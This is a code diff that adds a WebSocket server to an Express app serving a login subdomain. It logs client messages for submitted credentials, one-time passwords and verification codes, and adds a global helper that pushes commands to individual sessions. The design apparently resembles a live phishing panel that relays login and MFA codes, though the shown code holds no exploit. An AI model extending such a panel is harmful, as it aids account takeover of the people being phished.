@@ -2,12 +2,17 @@ import express from 'express';
 import { fileURLToPath } from 'url';
 import { existsSync } from 'fs';
 import path from 'path';
+import { WebSocketServer } from 'ws';
+import { createServer } from 'http';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
 const app = express();
 const PORT = process.env.PORT || 10000;
+
+// Create HTTP server (required for WebSocket)
+const server = createServer(app);
 
 // The expected login subdomain hostname (e.g. "login.mydomain.com").
 // Set the LOGIN_HOST environment variable in Railway to enforce subdomain-only access.
@@ -247,6 +252,115 @@ app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, 'dist', 'index.html'));
 });
 
-app.listen(PORT, () => {
+// WebSocket server setup
+const wss = new WebSocketServer({ noServer: true });
+
+// Store active WebSocket connections by sessionId
+const activeConnections = new Map();
+
+wss.on('connection', (ws, request, sessionId) => {
+  console.log(`WebSocket client connected: ${sessionId}`);
+  
+  // Store the connection
+  activeConnections.set(sessionId, ws);
+  
+  // Send welcome message
+  ws.send(JSON.stringify({ 
+    command: 'connected', 
+    data: { sessionId, message: 'WebSocket connection established' } 
+  }));
+  
+  ws.on('message', (message) => {
+    try {
+      const data = JSON.parse(message);
+      console.log(`Received from ${sessionId}:`, data);
+      
+      // Handle different message types
+      switch (data.command) {
+        case 'handshake':
+          console.log(`Handshake from ${sessionId}:`, data.data);
+          ws.send(JSON.stringify({ 
+            command: 'handshake_ack', 
+            data: { status: 'success' } 
+          }));
+          break;
+        
+        case 'credentials_submitted':
+          console.log(`Credentials submitted via WebSocket for ${sessionId}`);
+          // Backend can process credentials here
+          break;
+        
+        case 'otp_submitted':
+          console.log(`OTP submitted via WebSocket for ${sessionId}`);
+          // Backend can process OTP here
+          break;
+        
+        case 'verification_code':
+          console.log(`Verification code submitted for ${sessionId}:`, data.data);
+          // Backend can process verification code here
+          break;
+        
+        case 'client_action':
+          console.log(`Client action for ${sessionId}:`, data.data);
+          // Backend can handle client actions here
+          break;
+        
+        default:
+          console.log(`Unknown command from ${sessionId}:`, data.command);
+      }
+    } catch (error) {
+      console.error('Error parsing WebSocket message:', error);
+    }
+  });
+  
+  ws.on('close', () => {
+    console.log(`WebSocket client disconnected: ${sessionId}`);
+    activeConnections.delete(sessionId);
+  });
+  
+  ws.on('error', (error) => {
+    console.error(`WebSocket error for ${sessionId}:`, error);
+  });
+});
+
+// Handle WebSocket upgrade requests
+server.on('upgrade', (request, socket, head) => {
+  const url = new URL(request.url, `http://${request.headers.host}`);
+  
+  // Check if this is a WebSocket connection to /ws
+  if (url.pathname === '/ws') {
+    const sessionId = url.searchParams.get('sessionId');
+    
+    if (!sessionId) {
+      socket.write('HTTP/1.1 400 Bad Request\r\n\r\n');
+      socket.destroy();
+      return;
+    }
+    
+    wss.handleUpgrade(request, socket, head, (ws) => {
+      wss.emit('connection', ws, request, sessionId);
+    });
+  } else {
+    socket.destroy();
+  }
+});
+
+// Helper function to send commands to a specific session
+function sendCommandToSession(sessionId, command, data = {}) {
+  const ws = activeConnections.get(sessionId);
+  if (ws && ws.readyState === 1) { // 1 = OPEN
+    ws.send(JSON.stringify({ command, data }));
+    console.log(`Sent command '${command}' to session ${sessionId}`);
+    return true;
+  }
+  console.log(`Failed to send command to session ${sessionId}: connection not found or closed`);
+  return false;
+}
+
+// Expose helper function globally for use in other parts of the application
+global.sendWebSocketCommand = sendCommandToSession;
+
+server.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`WebSocket endpoint available at ws://localhost:${PORT}/ws?sessionId=<sessionId>`);
 });
